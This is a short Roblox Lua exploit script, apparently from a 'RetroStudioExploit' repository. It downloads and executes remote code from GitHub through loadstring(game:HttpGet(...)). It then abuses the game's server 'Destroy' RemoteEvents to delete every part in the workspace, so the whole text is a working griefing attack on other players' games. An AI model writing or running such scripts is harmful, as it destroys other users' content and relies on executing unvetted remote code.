local github = 'https://raw.githubusercontent.com/RetroStudioExploit/'
local suffix = '/refs/heads/main/'

function loadScript(url:string)
    return loadstring(game:HttpGet(url))()
end
local REFLECT = loadScript(github .. 'RetroScripts' .. suffix .. 'Globals/Reflect.lua')

local tools = {}
for _, v in pairs(REFLECT.getType(game, "RemoteEvent")) do
	if v.Parent.Name == "Destroy" then
		table.insert(tools, v)
	end
end

function Delete(obj)
    local remote = tools[math.random(0, #tools)]
	if remote == nil then return end
    remote:FireServer(unpack({
        [1] = obj,
        [2] = "",
        [3] = "",
        [4] = "",
        [5] = ""
    }))
end

for _, v in workspace:GetDescendants() do
    if v:IsA("Part") or v:IsA("BasePart") then
        Delete(v)
    end
end